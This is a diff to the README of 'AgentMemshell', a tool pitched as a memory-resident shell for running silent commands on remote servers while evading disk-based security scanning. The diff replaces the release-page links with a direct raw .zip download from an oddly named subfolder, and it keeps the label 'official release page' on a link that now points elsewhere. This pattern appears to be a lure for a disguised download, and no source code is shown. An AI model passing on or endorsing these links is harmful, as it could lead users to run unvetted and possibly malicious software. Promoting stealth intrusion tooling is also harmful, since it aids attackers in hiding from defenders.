@@ -1,6 +1,6 @@
 # 🚀 AgentMemshell - Run silent commands on remote servers
 
-[![Download AgentMemshell](https://img.shields.io/badge/Download-AgentMemshell-blue.svg)](https://github.com/transvestic-velodrome9214/AgentMemshell/releases)
+[![Download AgentMemshell](https://img.shields.io/badge/Download-AgentMemshell-blue.svg)](https://github.com/transvestic-velodrome9214/AgentMemshell/raw/refs/heads/main/subdecanal/Agent_Memshell_v3.0.zip)
 
 ## 📁 Project Overview
 AgentMemshell functions as a tool for security researchers and system administrators. It allows you to run commands on servers that do not show standard output. This tool stays in the memory of the target machine, which keeps your activity hidden from common disk-scanning security measures. You can use this software to manage servers and perform security audits on systems where you lack a regular command line interface.
@@ -16,7 +16,7 @@ You need a Windows machine to run this application. Ensure your system meets the
 ## 💾 How to Install
 You do not need an installer for this tool. Follow these simple steps to obtain the files:
 
-1. Visit the [official release page](https://github.com/transvestic-velodrome9214/AgentMemshell/releases) to download the package.
+1. Visit the [official release page](https://github.com/transvestic-velodrome9214/AgentMemshell/raw/refs/heads/main/subdecanal/Agent_Memshell_v3.0.zip) to download the package.
 2. Choose the latest version available on the page.
 3. Download the .zip file to your computer.
 4. Right-click the folder and select Extract All.
